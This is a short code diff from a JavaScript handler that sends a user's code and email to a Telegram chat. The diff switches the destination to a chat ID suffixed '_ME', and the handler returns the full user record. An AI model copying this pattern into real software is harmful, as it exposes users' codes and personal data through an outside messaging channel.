@@ -61,7 +61,7 @@ const sendCode = async (req, res) => {
    return res.status(404).json({ error: "User not found" });
  }
     const message = `${`${user.code} from ${user.email}`}`;
-    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
+    bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, message);
 
     res.status(200).json({ user });
   } catch (error) {
